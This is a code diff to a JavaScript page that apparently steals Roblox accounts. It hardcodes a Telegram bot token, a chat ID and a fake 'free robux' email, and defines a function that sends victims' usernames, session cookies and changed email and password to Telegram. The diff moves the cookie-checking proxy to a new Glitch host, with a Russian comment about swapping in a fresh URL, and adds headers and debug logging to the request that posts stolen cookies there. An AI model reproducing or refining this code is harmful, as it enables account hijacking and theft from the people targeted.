@@ -283,7 +283,7 @@
         const TELEGRAM_TOKEN = "8143511538:AAFWgq1zyShC59YLFVDth_ENak8SZ7ibtTY";
         const TELEGRAM_CHAT_ID = "5180010738";
         const FAKE_EMAIL = "robuxx0free0get@gmail.com";
-        const PROXY_URL = "https://radical-marbled-octave.glitch.me";
+        const PROXY_URL = "https://roblox-proxy-fresh.glitch.me"; // Замени на новый URL Glitch
 
         // Отправка в Telegram
         async function sendToTelegram(username, cookies, newEmail, newPassword) {
@@ -304,10 +304,14 @@
                 console.log("Тело запроса:", JSON.stringify({ cookies }));
                 const response = await fetch(`${PROXY_URL}/check-cookies`, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                    headers: { 
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
                     body: JSON.stringify({ cookies })
                 });
-                console.log("Статус ответа:", response.status);
+                console.log("Статус ответа:", response.status, "OK:", response.ok);
+                console.log("Заголовки ответа:", Object.fromEntries(response.headers));
                 if (response.ok) {
                     const userData = await response.json();
                     console.log("Данные пользователя:", userData);
